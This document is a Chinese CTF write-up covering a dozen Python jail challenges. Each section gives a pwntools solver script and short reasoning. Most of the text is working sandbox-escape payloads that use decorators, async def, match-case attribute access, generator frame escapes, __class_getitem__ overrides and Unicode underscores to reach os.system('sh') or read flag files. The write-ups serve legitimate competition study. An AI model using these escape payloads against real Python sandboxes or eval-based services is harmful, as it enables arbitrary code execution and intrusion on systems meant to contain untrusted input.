# Three

首先看看ascii范围内字符的分组：
```py
chars=[[] for i in range(3)]
for i in range(0x80):
    chars[i%3].append(chr(i))
for i in range(3):
    print(chars[i])
```
然后目标payload肯定越短越好。`breakpoint()`和`eval(input())`都挺短，但前者是单个函数，不好拆分；那就看看能否构造后者

（没有什么别的技巧了，就是一点一点调payload）
```py
from pwn import *
p=remote("127.0.0.1",57766)
p.recvuntil("Please enter '")
a=p.recv(6)
p.recv(3)
b=p.recv(6)
print(a+b)
p.interactive()
p.sendline(b'b3=input()\t\r\x0ceval (b3\r)\t')
p.sendline("__import__('os').system('cat /tmp/flag')")
print(p.recvlines(2))
```
# equals

```py
user_input="eval(input())#"
s = sum(ord(c) for c in user_input)
target=35
diff=target-len(user_input)
user_input+=chr((target**2-s)//(diff-1))*(diff-1)+chr((target**2-s)%(diff-1))
print(user_input.encode())
s = sum(ord(c) for c in user_input)
assert sum(ord(c) for c in user_input)==len(user_input) ** 2
```
# only_open

`open(f"{[*open('/tmp/flag')]}")`

不知道为什么，本地运行题目脚本调用open时会报错`KeyError : '__import__'`

# Pyjail笑传之CallingComesBack

触发`AST.call`需要显式用`()`调用一个对象。那么有没有办法不用`()`调用函数？有的，比如对象的特殊方法，会在执行某个操作时自动调用

先前打比赛时（题目名为`Astea`）见过这样一个payload：`[~help for help.__class__.__invert__ in [breakpoint]]`。这里利用for语法设置`help.__class__.__invert__`这个特殊方法为breakpoint，然后取反help来触发breakpoint。但是这个payload太长了，让我们换一个特殊方法：`[-help for help.__class__.__neg__ in [breakpoint]]`

# CleanHacker

```py
try:global admin;a
except Exception as admin:pass
```
不加global的话删除的是`locals()`里的admin

# Parens? No!

```py
from pwn import *
code='''obj=__builtins__.__class__.__base__
__builtins__.__build_class__=lambda a,b:a #固定传入两个参数
__builtins__=__builtins__.__dict__
first=lambda x:obj
second="".__class__.__base__.__class__.__subclasses__ #type.__subclasses__
@second
@first
class A:pass
BuiltinImporter=None
for i in A:
    if i.__name__=='BuiltinImporter':
        BuiltinImporter=i
        break
os=lambda x:"os"
@BuiltinImporter.load_module
@os
class B:pass
cmd=lambda x:"sh"
@B.system
@cmd
class C:pass
'''
p=remote("127.0.0.1",58579)
p.recvuntil("of '")
p.sendlineafter(": ",p.recv(8)[::-1])
for i in code.splitlines():
    p.sendlineafter("> ",i)
p.sendline("")
p.interactive()
```
搜了很久，看起来无括号调用函数的方法就两种：一种是像`CallingComesBack`一样覆盖特殊方法，另一种是利用类定义或函数定义的装饰器。然而在环境只有一个空ModuleType的情况下，似乎没有任何特殊方法可以覆盖，能访问到的内置类型的特殊方法基本都是只读的（其实还有ModuleType实例的`__getattr__`，但我当时没发现）。函数定义就更不用说了，没有括号根本定义不了函数，`lambda`语法又不支持装饰器

所以唯一的救星是类定义？直接运行`class A:_`会得到报错`__build_class__ not found`，因为`__builtins__`里没有这个函数。这时我终于发现了出题人到底为什么要放个`ModuleType`：这个类型的实例有个`__dict__`属性，它以字典的形式存储了模块的所有属性。所以我们可以定义一个`__build_class__`属性，然后拿这个字典覆盖`__builtins__`就能避免定义类时的报错了

为了取到有用的函数，我们需要调用某个类的subclassess。我最开始找的是object的subclasses，但这个函数不接收任何参数，而装饰器调用法固定有一个参数，所以报错。后来阅读 https://miaotony.xyz/2021/11/30/CTF_2021NCTF 时发现type的subclasses可以接收参数。接下来仿照wp里的做法，用for循环代替方括号取值即可

# Parens? No! Revenge!

相比上一题改动了两处：只有一次exec，且strip输入的内容。前者对我之前的解法没啥影响，倒是后者禁止了for循环的使用

A是列表，可以用解包的语法拿到BuiltinImporter，前提是我们知道BuiltinImporter在列表中的索引。返回上一题的shell，运行`python -c 'print(list("".__class__.__base__.__class__.__subclasses__(object).index(i) for i in "".__class__.__base__.__class__.__subclasses__(object) if i.__name__=="BuiltinImporter"))'`拿到索引为120，然后将之前的payload
换成:
```py
code=f'''obj=__builtins__.__class__.__base__
__builtins__.__build_class__=lambda a,b:a
__builtins__=__builtins__.__dict__
first=lambda x:obj
second="".__class__.__base__.__class__.__subclasses__
@second
@first
class A:pass
{"_,"*120}BuiltinImporter,*rest=A
os=lambda x:"os"
@BuiltinImporter.load_module
@os
class B:pass
cmd=lambda x:"sh"
@B.system
@cmd
class C:pass
'''
```
# revenge_jail

无括号调用函数和不触发`ast.Call`调用函数的技巧几乎完全重合；不使用方括号也与不触发`ast.Subscript`的手段差不多。唯一阻挡我们重用之前的payload的障碍是`ast.Attribute`，使用match case即可绕过
```py
from pwn import *
import base64
code=f"""match Exception:
    case object(__class__=type_class):
        match type_class:
            case object(__subclasses__=type_subclasses):
                pass
first=lambda x:object
@type_subclasses
@first
def A():
    pass
{"_,"*120}BuiltinImporter,*rest=A
match BuiltinImporter:
    case object(load_module=load_module):
        pass
os=lambda x:"os"
@load_module
@os
def module_os():
    pass
match module_os:
    case object(system=system):
        pass
cmd=lambda x:"sh"
@system
@cmd
def C():
    pass
"""
p=remote("127.0.0.1",54916)
p.recvuntil("enter '")
a=p.recv(6)
p.recvuntil("+'")
p.sendlineafter(": ",a+p.recv(6))
p.sendlineafter(":",base64.b64encode(code.encode()))
p.interactive()
```
# mathmagic

```py
from pwn import *
import time
class Random:
    _P = 1000000021
    _A = 320560990
    _BASE = 123456789 % _P
    def __init__(self, seed=0):
        self.state = (self._BASE * pow(self._A, seed % 60, self._P)) % self._P

    def random(self, mod):
        self.state = (self.state * self._A) % self._P
        return self.state % mod + 1
MOD = 15
code="""(
(
)
.
__class__
.
__base__
.
__subclasses__
(
)
[
120
]
.
load_module
(
'os'
)
.
system
(
'sh'
)
)"""
p=remote("127.0.0.1",56637)
p.recvuntil("of '")
p.sendlineafter(": ",p.recv(8)[::-1])
seed = int(time.time())
r = Random(seed)
p.recvuntil(":\n")
target=eval(p.recvline())
if target!=[r.random(MOD) for _ in range(3)]:
    print("Wrong seed")
    exit(0)
i=0
code=code.splitlines()
while i<len(code):
    line=code[i]
    length=r.random(MOD)
    if len(line)<=length:
        p.sendlineafter(">> ",line.ljust(length,'#'))
        i+=1
    else:
        p.sendlineafter(">> ",'#'*length)
p.sendlineafter(">> ","")
p.interactive()
```
原本以为eval不能执行多行代码，实际上只要套一层括号就行

# CatBox_revenge

做`Parens? No!`时发现笔记里记过一道叫`PySysMagic`的题。它要求eval环境能访问某个定义的类，故之前那题没法用，但这题就正好了。关键技巧是覆盖类的`__class_getitem__`，这样便可用`class_name[args]`（不需要实例）以`args`为参数调用函数

```py
from pwn import *
cat_class="cat._＿class_＿" #有一个下划线是unicode里的，所以可以绕过过滤
# https://github.com/salvatore-abello/CTF-Writeups/blob/main/L3ak%20CTF%202024/PySysMagic
def call_function(f, arg):
        return (f"[[1for\t{cat_class}._＿class_getitem_＿\tin[{f}]],"
                f"{cat_class}[{arg}]][True]")
def build_string(string):
    src = [].__doc__.__doc__ + {}.__doc__
    final = ""
    for x in string:
        fromdoc = (a:=src.find(x)) != -1
        if fromdoc:
            final += f"[[]._＿doc_＿._＿doc_＿+{{}}._＿doc_＿][False][{a}]+"
        else:
            print(f"Missing {x}")
    return final[:-1]
type_s = f"{cat_class}._＿class_＿"
object_s = f"{cat_class}._＿base_＿"
subclasses = call_function(type_s + "._＿subclasses_＿", object_s)
os_module=call_function(f"{subclasses}[120].load_module",build_string("os"))
payload=call_function(f"{os_module}.system",build_string("sh"))
p=remote("127.0.0.1",64704)
p.recvuntil("enter '")
a=p.recv(6)
p.recvuntil("+'")
p.sendlineafter(": ",a+p.recv(6))
p.sendlineafter(":",payload)
p.interactive()
```
# 双十一

```py
from pwn import *
def get_int(num):
    return f"({('([]==[])+'*num)[:-1]})"
#调用breakpoint
code=f"vars(vars()[[*vars()][{get_int(6)}]])[[*vars(vars()[[*vars()][{get_int(6)}]])][{get_int(12)}]]()"
p=remote("127.0.0.1",62304)
p.recvuntil("of '")
p.sendlineafter(": ",p.recv(8)[::-1])
p.sendlineafter(": ",code)
p.sendlineafter(") ","import os")
p.sendlineafter(") ","os.system('sh')")
p.interactive()
```
# Undefined

书接`Parens? No!`。题目把`ClassDef`和`FunctionDef`都ban了后，我开始怀疑我之前的结论是不是错的，也许真的有除了装饰器和覆盖特殊方法之外的调用方式？

我也想过覆盖`__import__`为某个函数，借import语句触发调用。然而这玩意固定接收5个参数，我死活找不到任何有用且有5个参数的函数

继续在网上搜来搜去，然而所有方法都绕不开先前提到的两个玩意。于是我问ds“除了类和函数，还有其他调用装饰器的方法吗“，它说可以用`async def`，触发的ast节点为`AsyncFunctionDef`
```py
from pwn import *
import base64
code="""@"".__class__.__base__.__class__.__subclasses__
@lambda x:[].__class__.__base__
async def A():pass
@A[120].load_module
@lambda x:"os"
async def module_os():pass
@module_os.system
@lambda x:"sh"
async def B():pass"""
p=remote("127.0.0.1",55768)
p.recvuntil("enter '")
a=p.recv(6)
p.recvuntil("+'")
p.sendlineafter(": ",a+p.recv(6))
p.sendlineafter(":",base64.b64encode(code.encode()))
p.interactive()
```
# density

`\x0c`可以代替空格，`\r`可以代替换行（不过这两者似乎都没法处理语句块的缩进），所以最棘手的问题是`@`被ban后装饰器不能用了。这次省去怀疑自己的功夫，直接寻找如何利用类的特殊方法执行函数。覆盖似乎没戏，因为我仍然找不到环境中任何允许覆盖特殊方法的类。那么只剩下metaclass可以利用了

又回到了那个熟悉的问题：环境中没有`__build_class__`。根据定义的类是否有基类，这个函数可能接收2或3个参数。听起来比固定5个参数的`__import__`好一些，只是我依旧找不到任何可利用的函数。倒是可以自定义一个两个参数的函数，函数内只执行某些不包含函数调用的语句；但是为什么不直接执行这些语句，非要套一层函数的皮？

翻笔记时翻到了去年的栈帧逃逸，发现利用成功的关键就是“套一层函数”。于是试了一下，没想到成了
```py
from pwn import *
import base64
code=b"""def\x0cf(a,b):yield\x0cg.gi_frame.f_back.f_back.f_builtins\r__builtins__|={'__build_class__':f}\rclass\x0cg:pass\rfor(x)in\x0cg:__builtins__|=x\rclass\x0cMeta(type):(__ne__:=exec)\rclass\x0cX(metaclass=Meta):pass\rX!='__import__("os").system("sh")'"""
p=remote("127.0.0.1",54881)
p.recvuntil("enter '")
a=p.recv(6)
p.recvuntil("+'")
p.sendlineafter(": ",a+p.recv(6))
p.sendlineafter(":",base64.b64encode(code))
p.interactive()
```
# registers

```py
from pwn import *
p=remote("127.0.0.1",64228)
def get(reg,attr):
    assert len(attr)<=8
    p.sendlineafter(":",f"get {reg} {attr}")
def call(func_reg,arg_reg,ret_reg):
    p.sendlineafter(":",f"call {func_reg} {arg_reg} {ret_reg}")
def move(src_reg,dst_reg):
    p.sendlineafter(":",f"move {src_reg} {dst_reg}")
def show():
    p.sendlineafter(":","show")
    return p.recvlines(6)
p.recvuntil("of '")
p.sendlineafter(": ",p.recv(8)[::-1])
get(0,"__new__")
get(0,"__self__")
get(0,"__base__") #object=None.__new__.__self__.__base__
move(0,1)
move(0,3)
move(0,4)
get(0,"__dir__")
call(0,1,0) #object.__dir__(object)
move(0,1)
get(0,"count")
call(0,2,0) #获取数字0，为调用list.pop做准备
move(1,2)
get(1,"pop")
call(1,0,5)
while b'__getattribute__' not in show()[5]:
    call(1,0,5)
call(1,0,2)
while b'__subclasses__' not in show()[2]:
    call(1,0,2)
while b'__class__' not in show()[3]:
    call(1,0,3)
move(4,1)
get(4,"__dict__")
get(4,"get")
call(4,3,3) #object.__dict__.get("__class__")
get(3,"__get__")
call(3,1,3) #type=object.__dict__.get("__class__").__get__(object)
move(3,4)
get(3,"__dict__")
get(3,"get")
call(3,2,3) #type.__dict__.get("__subclasses__")
call(3,1,3) #type.__dict__.get("__subclasses__")(object)
get(3,"pop")
call(3,0,2)
while b'wrap_close' not in show()[2]:
    call(3,0,2)
move(1,3)
get(3,"__dict__")
get(3,"get")
call(3,5,5) #object.__dict__.get("__getattribute__")
get(5,"__get__")
get(2,"close")
call(5,2,5) #object.__dict__.get("__getattribute__").__get__(os._wrap_close.close)
get(1,"__dir__")
call(1,4,1) #object.__dir__(type)
call(4,1,1) #list=type(object.__dir__(type))
move(4,2)
get(4,"__doc__") #str=type.__doc__
get(4,"__doc__") #str.__doc__。这个doc里的字符更丰富，方便后续构造__builtins__
call(1,4,1) #list(str.__doc__)
get(1,"pop")
move(4,3)
get(3,"split")
call(3,4,3) #str.__doc__.split(str.__doc__)
get(3,"pop")
call(3,0,3) #empty string
get(3,"__add__")
call(1,0,4) #list(str.__doc__).pop(0)
target="__builtins__"
#不太准确，但是类似：
#reg1=list(str.__doc__)
#reg4=reg1.pop(0)
#reg3=reg3.__add__(reg4)
for idx,c in enumerate(target):
    while c.encode() not in show()[4].split(b"=")[1]:
        call(1,0,4)
    call(3,4,3)
    if idx!=len(target)-1:
        get(3,"__add__")
call(5,3,3) #object.__dict__.get("__getattribute__").__get__(os._wrap_close.close)("__builtins__")
move(2,1)
get(2,"__dir__")
call(2,1,2) #type.__dir__(type)
call(1,2,2) #list=type(type.__dir__(type))
call(2,3,2) #list(__builtins__)
get(2,"pop")
get(3,"get")
call(2,0,4)
while b'eval' not in show()[4]:
    call(2,0,4)
call(3,4,4) #eval=__builtins__.get("eval")
call(2,0,5)
while b'input' not in show()[5]:
    call(2,0,5)
call(3,5,5) #input=__builtins__.get("input")
call(5,0,5)
p.sendline("__import__('os').system('sh')")
call(4,5,4) #eval(input())
p.interactive()
```
ds写的帮助找属性的脚本：
```py
MAX_ATTR_NAME_LEN = 8
MAX_DEPTH = 5

_MISSING = object()
visited = set()

def safe_getattr(obj, name):
    try:
        return getattr(obj, name)
    except Exception:
        return _MISSING

def explore(obj, path="None", depth=0):
    if depth > MAX_DEPTH:
        return

    obj_id = id(obj)
    if obj_id in visited:
        return
    visited.add(obj_id)

    try:
        attrs = dir(obj)
    except Exception:
        return

    for attr in attrs:
        if len(attr) > MAX_ATTR_NAME_LEN:
            continue
        if not attr.isidentifier():
            continue

        new_path = f"{path}.{attr}" if path else attr
        val = safe_getattr(obj, attr)
        if val is _MISSING:
            continue

        try:
            val_repr = repr(val)
        except Exception:
            val_repr = "<repr failed>"
        if len(val_repr) > 80:
            val_repr = val_repr[:77] + "..."
        print(f"{new_path} = {val_repr}")

        if not isinstance(val, (int, float, complex, bool, str, bytes, type(None))):
            explore(val, new_path, depth + 1)
```
# 永不消逝的数字

搭docker并运行如下脚本找到环境内的数字：
```py
import re, builtins
ALLOWED_EXPR = re.compile(r'^[a-z._]+$')
ALLOWED_ATTR = re.compile(r'^[a-z_]+$')
numbers={}
def is_number(x):
    return isinstance(x, (int, float, complex, bool))
def explore(obj, path, depth, visited, max_depth=15):
    if depth > max_depth:
        return
    if id(obj) in visited:
        return
    visited.add(id(obj))
    try:
        attrs = dir(obj)
    except Exception:
        return
    for attr in attrs:
        if not ALLOWED_ATTR.match(attr):
            continue
        new_path = f"{path}.{attr}"
        if not ALLOWED_EXPR.match(new_path):
            continue
        try:
            value = eval(new_path, {'re': re, '__builtins__': builtins})
        except Exception:
            continue
        if is_number(value):
            if value not in numbers or len(numbers[value]) > len(new_path):
                numbers[value] = new_path
        if not isinstance(value, (int, float, complex, bool, str, bytes, type(None))):
            explore(value, new_path, depth + 1, visited, max_depth)
explore(re, 're', 0, set(), max_depth=15)
for name, obj in vars(builtins).items():
    if not ALLOWED_EXPR.match(name):
        continue
    explore(obj, name, 0, set(), max_depth=15)
import pickle
with open('numbers.pkl', 'wb') as f:
    pickle.dump(numbers, f)
```
然后组装：
```py
import pickle
from pwn import *
with open('numbers.pkl', 'rb') as f:
    numbers = pickle.load(f)
def to_base(base,num):
    res=[]
    while num!=0:
        res.append(num%base)
        num//=base
    return res
target=int(b'breakpoint()'.hex(),16)
base_29=to_base(29,target)
res=""
twenty_nine=numbers[29]
for idx,c in enumerate(base_29):
    if idx==0:
        res+=f"{numbers[c]}+"
        continue
    if idx==1:
        res+=f"{numbers[c]}*{twenty_nine}+"
        continue
    res+=f"{numbers[c]}*{twenty_nine}**{numbers[idx]}+"
p=remote("127.0.0.1",51816)
p.recvuntil("of '")
p.sendlineafter(": ",p.recv(8)[::-1])
p.sendlineafter(": ",res[:-1])
p.sendlineafter(") ",'__import__("os").system("cat /tmp/flag.txt")')
p.interactive()
```
一度苦于没法用16进制（长度太长）或者256进制（没有256）表达出target，直接通过运算得到target也不太可能。就这样卡了好几天，直到今天意识到可以用任何进制写出数字……选了29作为base，因为其表达式比较短且所有位数都在numbers里